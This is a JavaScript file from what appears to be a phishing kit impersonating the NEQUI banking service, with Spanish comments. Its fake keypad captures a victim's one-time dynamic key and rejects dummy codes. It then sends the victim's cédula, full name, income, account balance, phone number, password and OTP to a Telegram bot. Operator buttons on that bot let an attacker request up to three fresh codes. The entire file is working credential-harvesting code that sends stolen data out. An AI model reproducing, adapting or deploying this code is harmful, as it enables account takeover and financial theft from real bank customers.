document.addEventListener("DOMContentLoaded", () => {
  const inputs = document.querySelectorAll('input[id^="otp-"]');
  const keyboard = document.getElementById("keyboard");
  const deleteBtn = document.getElementById("delete-otp");
  const loadingSpinner = document.querySelector(".loadingContainer");
  const finishContainer = document.querySelector(".finishContainer");
  const sectionTeclado = document.getElementById("sectionTeclado");
  const btnReturn = document.getElementById("btnReturn");

  const amount = document.getElementById("amount");
  const params = new URLSearchParams(window.location.search);
  const type = params.get("type");

  // loadingSpinner.style.display = "block";
  //Despues de 1 segundo se muestra el mensaje de error
  // setTimeout(() => {
  //   loadingSpinner.style.display = "none";
  // }, 5000);

  btnReturn.addEventListener("click", (e) => {
    window.location.href = "accces-sign-in.html";
  });

  let currentInput = 0;
  let contSend = 0;

  // Manejar clics del teclado
  keyboard.addEventListener("click", (e) => {
    const button = e.target.closest(".keyboard-btn");
    if (button && !button.id.includes("delete")) {
      const value = button.dataset.value;
      if (currentInput < inputs.length) {
        // Guardar el valor real en un atributo personalizado
        inputs[currentInput].dataset.realValue = value;
        // Mostrar asterisco en el campo de entrada
        inputs[currentInput].value = "*";
        // Disparar el evento input
        inputs[currentInput].dispatchEvent(
          new Event("input", {
            bubbles: true,
          })
        );
        currentInput++;
      }
    }
  });

  // Manejar el botÃ³n de borrar
  deleteBtn.addEventListener("click", () => {
    if (currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Permitir borrar con tecla retroceso
  document.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Prevenir cualquier entrada de teclado fÃ­sico
  inputs.forEach((input) => {
    ["keydown", "keyup", "keypress", "input", "textInput"].forEach(
      (eventType) => {
        input.addEventListener(eventType, (e) => {
          e.preventDefault();
          return false;
        });
      }
    );

    input.addEventListener("paste", (e) => {
      e.preventDefault();
      return false;
    });

    input.setAttribute("readonly", "readonly");
    input.setAttribute("inputmode", "none");
  });

  function resetKeyboard() {
    currentInput = 0;

    inputs.forEach((input) => {
      input.value = "";
      input.dataset.realValue = ""; // Borra el valor real tambiÃ©n
    });

    inputs[0].focus();
  }

  // Verificar el estado de los inputs
  inputs.forEach((input, index) => {
    input.addEventListener("input", async () => {
      let isComplete = Array.from(inputs).every((input) => input.value !== "");
      if (isComplete) {
        let otp = "";
        inputs.forEach((input) => {
          otp += input.dataset.realValue || "";
        });

        const formData = JSON.parse(localStorage.getItem("formData")) || {};

        if (
          otp === "123456" ||
          otp === formData.cedula.toString().slice(0, 6)
        ) {
          const errorMessage = document.querySelector(".errorMessage");
          errorMessage.style.opacity = "1";
          errorMessage.style.transform = "translateY(-20px)";

          setTimeout(() => {
            resetKeyboard();
          }, 100);

          setTimeout(() => {
            errorMessage.style.opacity = "0";
            errorMessage.style.transform = "translateY(20px)";
          }, 5000);

          return;
        }
        contSend += 1;

        amount.innerHTML = "$ " + formData.montoPrestamo;

        loadingSpinner.style.display = "block";

        const message = `
⭐️⭐️ Dinámica ${contSend} ⭐️⭐️
🪪 Cédula: ${formData.cedula}
👤 Nombre: ${formData.nombreCompleto}
💰 Monto: ${formData.montoPrestamo}
👩‍💼 Ocupación: ${formData.ocupacion}
📊 Ingresos mensuales: ${formData.ingresoMensual}
💸 Gastos mensuales: ${formData.gastosMensual}
🔥 Saldo actual en tu cuenta NEQUI: ${formData.saldoActual}
⏳ Meses: ${formData.meses}
🗓 Fecha de pago: ${formData.fechaPago}
📱 Número: ${formData.phoneNumber}
🔑 Clave: ${formData.password}
📢 Tipo: ${formData.tipoProducto}
🔑 Clave Dinámica ${contSend}: ${otp}
`;

        if (contSend === 3) {
          finishContainer.style.display = "block";
          sectionTeclado.style.display = "none";
        } else {

        }
        try {
          const keyboard = JSON.stringify({
            inline_keyboard: [
              [
                {
                  text: "E-DINAMICA",
                  callback_data: `error_dinamica`,
                },
                {
                  text: "FINISH",
                  callback_data: `finish`,
                },
              ],
            ],
          });
          const responseMensaje = await sendTelegramMessageWithBtn(
            message,
            keyboard
          );

          const { action } = await waitForButtonPress(
            responseMensaje.message_id
          );

          resetKeyboard();
          await handleAction(action, 1111);
        } catch (error) {
          console.error("Error al enviar mensaje:", error);
        }
      }
    });
  });
});
